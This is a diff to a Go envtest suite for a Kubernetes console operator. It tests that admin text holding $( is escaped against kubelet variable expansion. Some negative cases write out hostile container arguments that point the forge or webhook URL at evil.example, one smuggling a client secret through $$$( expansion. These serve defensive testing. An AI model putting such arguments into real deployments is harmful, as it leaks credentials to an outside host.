@@ -487,10 +487,18 @@ func TestEnvtest(t *testing.T) {
 		routerCA := app()
 		rc := &routerCA.Spec.Template.Spec.Containers[0]
 		rc.Env = append(rc.Env, corev1.EnvVar{Name: "DOTVIRT_OAUTH_CA", Value: adminobjects.IngressCAPath})
+		// An admin's text holding $(, as the operator renders it: escaped.
+		adminText := dv.DeepCopy()
+		adminText.Spec.Branding.ProductName = "Acme $(beta)"
+		adminText.Spec.Branding.Links = []dotvirtv1alpha1.BrandingLink{{Label: "Docs $(beta)", URL: "https://docs.example/$(beta)"}}
+		literal := app()
+		literal.Spec.Template.Spec.Containers[0].Args = append(literal.Spec.Template.Spec.Containers[0].Args, "-forge-web-url=https://forge.example/$$(x)")
 		for name, d := range map[string]*appsv1.Deployment{
 			"the console as rendered": app(), "the forge as rendered": forge(),
-			"the console trusting the router CA for SSO": routerCA,
-			"a new release by digest":                    newDigest, "a new forge release by tag": newTag,
+			"the console with an admin's text holding $(": install.Deployment(adminText, "argocd", nil),
+			"an argument holding a literal $$(":           literal,
+			"the console trusting the router CA for SSO":  routerCA,
+			"a new release by digest":                     newDigest, "a new forge release by tag": newTag,
 			"a release with a new console flag": newFlag, "a release with a new forge bootstrap": newBootstrap,
 		} {
 			if err := dryApply(d); err != nil {
@@ -624,6 +632,11 @@ func TestEnvtest(t *testing.T) {
 			"the console sending an admin's forge credential elsewhere by flag": {app, func(d *appsv1.Deployment) {
 				c := &d.Spec.Template.Spec.Containers[0]
 				c.Args = append(slices.Clone(c.Args), "-forge-url=https://evil.example")
+			}},
+			// $$ pairs as the kubelet reads it: $$$( still expands.
+			"an argument carrying a Secret past a doubled dollar": {app, func(d *appsv1.Deployment) {
+				c := &d.Spec.Template.Spec.Containers[0]
+				c.Args = append(slices.Clone(c.Args), "-webhook-url=https://evil.example/$$$(DOTVIRT_FORGE_CLIENT_SECRET)")
 			}},
 			// The kubelet would put a Secret's value where $(NAME) stands.
 			"the console's webhook URL carrying a Secret": {app, func(d *appsv1.Deployment) {
@@ -1101,7 +1114,8 @@ func TestEnvtest(t *testing.T) {
 		// The branding ConfigMap and the OIDC client secret an admin chose: the
 		// secret reaches the console under its own env only.
 		chosen.BrandingConfigMap = "brand"
-		chosen.OIDCSecret, chosen.OIDCSecretKey, chosen.OIDCIssuer = "admin-oidc", "client-secret", "https://idp.example"
+		// An issuer holding $( (its CRD pattern admits it), rendered escaped.
+		chosen.OIDCSecret, chosen.OIDCSecretKey, chosen.OIDCIssuer = "admin-oidc", "client-secret", "https://idp.example/$(realm)"
 		// Delegated pull requests through the forge application an admin
 		// registered: users' tokens and its client secret go only where the
 		// spec says.
@@ -1121,7 +1135,7 @@ func TestEnvtest(t *testing.T) {
 		}
 		oidc := app()
 		withEnv(fromSecret("DOTVIRT_OIDC_CLIENT_SECRET", "admin-oidc", "client-secret"),
-			corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: chosen.OIDCIssuer})(oidc)
+			corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: adminobjects.KubeletLiteral(chosen.OIDCIssuer)})(oidc)
 		oidcIssuerElsewhere := oidc.DeepCopy()
 		withEnv(corev1.EnvVar{Name: "DOTVIRT_OIDC_ISSUER", Value: "https://evil.example"})(oidcIssuerElsewhere)
 		oidcElsewhere := app()
